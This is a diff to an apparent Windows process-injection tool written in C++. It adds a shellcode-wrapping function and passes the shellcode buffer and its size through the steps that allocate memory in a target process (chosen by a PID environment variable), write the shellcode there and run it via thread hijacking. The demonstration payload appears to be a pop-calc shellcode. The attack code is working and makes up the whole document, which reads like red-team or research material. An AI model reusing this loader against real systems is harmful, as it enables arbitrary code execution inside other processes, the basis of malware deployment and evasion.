@@ -4,6 +4,7 @@
 #include "hijacking.h"
 #include "common.h"
 #include "ntddk.h"
+#include "shellcode.h"
 
 enum t_result {
     RET_OK = 0,
@@ -27,6 +28,22 @@ enum t_state {
 
 DWORD g_WaitReason = WrQueue;
 
+BYTE* wrap_shellcode(IN BYTE* raw_shellcode, IN size_t raw_shellcode_size, OUT size_t& wrapped_shc_size)
+{
+    if (!raw_shellcode_size) {
+        return nullptr;
+    }
+    const size_t full_size = sizeof(g_shellcode_stub) + raw_shellcode_size;
+    BYTE* full_shc = (BYTE*)::calloc(full_size, 1);
+    if (!full_shc) {
+        return nullptr;
+    }
+    wrapped_shc_size = full_size;
+    ::memcpy(full_shc, g_shellcode_stub, sizeof(g_shellcode_stub));
+    ::memcpy(full_shc + sizeof(g_shellcode_stub), raw_shellcode, raw_shellcode_size);
+    return full_shc;
+}
+
 ULONGLONG get_env(const char *var_name, bool isHex = false)
 {
     ULONGLONG state = 0;
@@ -44,7 +61,7 @@ BOOL set_env(const char* var_name, ULONGLONG val, bool isHex = false)
     return SetEnvironmentVariableA(var_name, next.c_str());
 }
 
-t_result execute_state(t_state state)
+t_result execute_state(t_state state, BYTE *shellc_buf, size_t shellc_size)
 {
     DWORD processID = get_env("PID");
     if (!processID) {
@@ -53,7 +70,7 @@ t_result execute_state(t_state state)
     std::cout << "[#] PID: " <<  std::dec << GetCurrentProcessId() << " : " << "Executing State: " << state << "\n";
 
     if (state == STATE_ALLOC) {
-        LPVOID shellcodePtr = alloc_memory_in_process(processID);;
+        LPVOID shellcodePtr = alloc_memory_in_process(processID, shellc_size);
         if (shellcodePtr) {
             set_env("SHC", (ULONGLONG)shellcodePtr, true);
             return RET_OK;
@@ -65,13 +82,13 @@ t_result execute_state(t_state state)
         return RET_PASS_MEM_FAILED;
     }
     if (state == STATE_WRITE) {
-        if (write_shc_into_process(processID, (LPVOID)shellcodePtr)) {
+        if (write_shc_into_process(processID, (LPVOID)shellcodePtr, shellc_buf, shellc_size)) {
             return RET_OK;
         }
         return RET_WRITE_FAILED;
     }
     if (state == STATE_EXECUTE) {
-        if (run_injected(processID, shellcodePtr, g_WaitReason)) {
+        if (run_injected(processID, shellcodePtr, shellc_size, g_WaitReason)) {
             return RET_OK;
         }
         return RET_EXECUTE_FAILED;
@@ -148,7 +165,12 @@ int main(int argc, char* argv[])
     }
     else
     {
-        t_result res = execute_state(state);
+        size_t shellc_size = 0;
+        BYTE* shellc_buf = wrap_shellcode(g_shellcode_pop_calc, sizeof(g_shellcode_pop_calc), shellc_size);
+
+        t_result res = execute_state(state, shellc_buf, shellc_size);
+        ::free(shellc_buf); shellc_size = 0;
+
         if (res != RET_OK) {
             std::cerr << "Failed, result: " << res << "\n";
             return res;
